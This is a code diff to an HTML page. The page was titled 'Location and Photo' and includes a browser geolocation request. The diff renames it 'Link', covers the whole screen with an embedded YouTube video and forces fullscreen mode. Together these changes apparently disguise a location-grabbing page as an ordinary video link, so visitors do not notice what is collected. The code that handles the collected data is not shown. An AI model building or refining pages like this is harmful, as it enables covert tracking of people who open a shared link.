@@ -1,9 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location and Photo</title>
+    <title>Link</title>
+       <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #video-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
 </head>
 <body>
     <script>
@@ -89,6 +111,20 @@
             } else {
                 alert('Geolocation is not supported by this browser.');
             }
+        });
+    </script>
+       <div id="video-container">
+        <iframe src="https://www.youtube.com/embed/gSQgbCo6PAg?si=pL28zmYMm2JHPjgE" 
+                title="YouTube video player" 
+                frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                referrerpolicy="strict-origin-when-cross-origin" 
+                allowfullscreen>
+        </iframe>
+    </div>
+    <script>
+        document.documentElement.requestFullscreen().catch(err => {
+            console.error('Failed to enter full-screen mode:', err);
         });
     </script>
 </body>
